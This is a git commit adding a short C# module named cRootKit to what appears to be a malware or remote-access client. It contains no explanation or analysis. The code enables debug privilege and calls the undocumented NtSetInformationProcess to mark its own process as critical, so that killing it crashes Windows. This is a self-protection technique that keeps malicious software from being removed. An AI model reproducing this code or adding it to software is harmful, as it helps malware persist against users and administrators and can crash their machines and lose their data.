115e53f8dff795663b8a81f7fa504b06a019c3e6
0xPh0enix <0xPh0enix@protonmail.com>
2020-04-20 12:19:24 +0300

    Add files via upload

---
+++ cRootKit.cs
@@ -0,0 +1,27 @@
+﻿using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace Client.Modules
+{
+    internal sealed class cRootKit
+    {
+
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+        public static bool Protect()
+        {
+            try
+            {
+                Process.EnterDebugMode();
+                int iIsCritical = -1;
+
+                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref iIsCritical, sizeof(int));
+
+                return true;
+            }
+            catch { return false;  }
+        }
+    }
+}
